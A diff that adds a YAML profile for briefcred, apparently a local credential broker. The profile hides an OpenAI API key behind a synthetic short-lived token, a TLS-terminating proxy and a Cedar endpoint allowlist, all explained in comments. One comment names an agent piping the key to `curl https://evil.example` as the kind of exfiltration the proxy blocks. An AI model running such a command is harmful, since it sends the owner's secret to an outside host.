@@ -1,0 +1,90 @@
+# An OpenAI API key that never reaches the agent.
+#
+# This is the profile the HTTP proxy exists for. The subprocess gets
+# `OPENAI_API_KEY` set to a synthetic token — `bc.<payload>.<signature>` —
+# which is useless to anything but briefcred's own proxy on this machine. The
+# real key stays in the daemon, and it is put into the request only after the
+# Cedar policy below has said the request is one this profile permits.
+#
+# What that buys, concretely: an agent that exfiltrates its whole environment
+# has exfiltrated a token that expires in fifteen minutes, only works through
+# `127.0.0.1`, only works for the session it was minted in, and only reaches
+# the two endpoints named here. An agent that pipes the key to
+# `curl https://evil.example` gets a 403 from briefcred, and a row in the
+# audit log saying so.
+#
+# Copy this file into your profiles directory and store the real key:
+#
+#     briefcred profile bootstrap openai
+#
+# The proxy terminates TLS with briefcred's own CA, so the machine has to
+# trust it. `briefcred install` generates one; `briefcred ca trust` installs it.
+# `briefcred exec` also sets the CA-bundle variables for runtimes that ignore
+# the system trust store, so `curl`, Node and Python all work as they are.
+
+name: openai
+description: the OpenAI API, through briefcred's proxy, on an allowlist
+
+unlock:
+  # A key that bills to a credit card is worth a fingerprint.
+  policy: biometric
+  cache_secs: 300
+
+credentials:
+  - name: openai
+    kind: http-bearer
+    # Fifteen minutes. The token is only useful through this machine's proxy
+    # and only for this session, so its lifetime is a backstop rather than the
+    # control — but a short one costs nothing.
+    ttl_secs: 900
+    # The real key, stored under `openai` in the master source.
+    source_key: openai
+
+# `enforce` refuses anything the policy below does not permit. Write a new
+# policy in `observe` first: it forwards the request and writes a
+# `ProxyRequest { decision: would_deny }` row instead, so you can read the
+# audit log, widen the policy until the would-denies stop, and only then
+# promote. Leaving a profile in `observe` is leaving it unguarded.
+policy_mode: enforce
+
+# Cedar. `principal` is the session, `action` is the HTTP method, and
+# `resource` carries `host`, `path` and `scheme`. There is deliberately no
+# query string: it routinely carries credentials, and a policy that could
+# match on one would be a policy that had to hold one.
+#
+# Default deny. Everything not permitted here is refused, including a profile
+# with no `policy:` block at all.
+policy: |
+  // Reading the model list is harmless and every SDK does it at startup.
+  permit(
+    principal,
+    action == Action::"GET",
+    resource
+  ) when {
+    resource.host == "api.openai.com" && resource.path == "/v1/models"
+  };
+
+  // Chat completions, and nothing else that costs money. Add
+  // `/v1/embeddings` or `/v1/responses` here when you need them; do not
+  // widen this to `like "/v1/*"`, which permits fine-tuning jobs and
+  // file uploads too.
+  permit(
+    principal,
+    action == Action::"POST",
+    resource
+  ) when {
+    resource.host == "api.openai.com"
+      && resource.path == "/v1/chat/completions"
+  };
+
+exec:
+  # Narrow this to whatever actually needs the key. Left open here because a
+  # profile that only works with one hard-coded agent binary is a profile
+  # nobody copies.
+  allow_argv0: []
+
+env:
+  # The synthetic token, under the name every OpenAI SDK reads. `TOKEN` is the
+  # field every `http-*` credential publishes; `PROXY_URL` is the other, for a
+  # runtime that ignores `HTTPS_PROXY` and needs to be told explicitly.
+  OPENAI_API_KEY: ${minted.openai.TOKEN}
